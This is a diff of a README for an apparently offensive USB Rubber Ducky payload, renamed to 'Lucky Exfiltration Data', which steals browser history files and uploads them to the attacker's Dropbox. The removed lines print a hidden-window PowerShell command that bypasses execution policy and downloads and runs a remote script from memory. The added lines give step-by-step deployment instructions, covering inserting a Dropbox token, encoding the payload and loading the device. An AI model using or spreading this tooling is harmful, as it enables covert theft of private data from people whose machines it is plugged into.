@@ -2,7 +2,6 @@
   <a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&pause=1000&width=435&lines=%22LED%22+-+Lucky+Exfiltration+Data+😈" alt="Typing SVG" /></a>
 </h1>
 
-
 <!-- TABLE OF CONTENTS -->
 <details>
   <summary>Table of Contents</summary>
@@ -11,22 +10,21 @@
     <li><a href="#getting-started">Getting Started</a></li>
     <li><a href="#Contributing">Contributing</a></li>
     <li><a href="#Version-History">Version History</a></li>
-    <li><a href="#Contact">Contact</a></li>
     <li><a href="#Acknowledgments">Acknowledgments</a></li>
   </ol>
 </details>
 
-# History-Pig
+# L.E.D - "Lucky Exfiltration Data"
 
-A payload to exfiltrate the history of the 2 most popular browsers
+A payload to exfiltrate browsers history files and upload them into the attacker Dropbox Folder.
 
 ## Description
 
-This payload will enumerate through the browser directories, looking for the file that stores the history
+Since the primary payload only starts a WIN + R console which will override the security execution commands prevention in Powershell, you will have to upload the file named LED.ps1 to your dropbox, and insert the link in the payload.txt file properly as the payload indicates.
 
-These files will be saved to the temp directory
-
-Finally dropbox will be used to exfiltrate the files to cloud storage
+After the command is executed and the LED.ps1 script launches, the files in the Directories listed in LED.ps1 will be uploaded automatically to your Dropbox Folder.
+(Attention: You must have a developer account in Dropbox which allow you to insert the uploading token to the API folder where the exfiltrated files will be uploaded.
+You can find information on this easily online.)
 
 ## Getting Started
 
@@ -39,20 +37,18 @@ Finally dropbox will be used to exfiltrate the files to cloud storage
 
 ### Executing program
 
-* Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
-```
-powershell -w h -NoP -NonI -ep Bypass $pl = iwr < Your Shared link for the intended file> ?dl=1; iex $pl
-```
+* Modify LED.ps1 file with your API Accces Token from Dropbox so your exfiltrated files are uploaded.
+* Modify 'payload.txt' file with your download link for your modified LED.ps1 file from Dropbox.
+* Use Duckyencoder.jar to encode the 'payload.txt' file into an 'inject.bin' USB Rubber Ducky can execute.
+  Note: If you prefer, you can use new HAK5 PayloadStudio Community Edition to encode the payload.txt file. <a href="https://payloadstudio.com/community/">LINK</a>
+* Insert inject.bin file into your SD card.
+* Place SD Card into your Rubber-Ducky, sit back and watch!
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
 ## Contributing
 
-All contributors names will be listed here
-
-atomiczsec
-I am Jakoby
+luckyman6
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -63,46 +59,10 @@ I am Jakoby
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
-<!-- CONTACT -->
-## Contact
-
-<h2 align="center">📱 My Socials 📱</h2>
-<div align=center>
-<table>
-  <tr>
-    <td align="center" width="96">
-      <a href="https://www.youtube.com/channel/UC-7iJTFN8-CsTTuXd3Va6mA?sub_confirmation=1">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/youtube-svgrepo-com.svg width="48" height="48" alt="C#" />
-      </a>
-      <br>YouTube
-    </td>
-    <td align="center" width="96">
-      <a href="https://twitter.com/atomiczsec">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/twitter.png width="48" height="48" alt="Python" />
-      </a>
-      <br>Twitter
-    </td>
-    <td align="center" width="96">
-      <a href="https://discord.gg/MYYER2ZcJF">
-        <img src=https://github.com/I-Am-Jakoby/I-Am-Jakoby/blob/main/img/discord-v2-svgrepo-com.svg width="48" height="48" alt="Jsonnet" />
-      </a>
-      <br>I-Am-Jakoby's Discord
-    </td>
-  </tr>
-</table>
-</div>
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-
-
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
 <!-- ACKNOWLEDGMENTS -->
 ## Acknowledgments
 
 * [Hak5](https://hak5.org/)
-* [I-Am-Jakoby](https://github.com/I-Am-Jakoby)
+* [Official-Repository-Payloads](https://github.com/hak5/usbrubberducky-payloads)
 
 <p align="right">(<a href="#top">back to top</a>)</p>
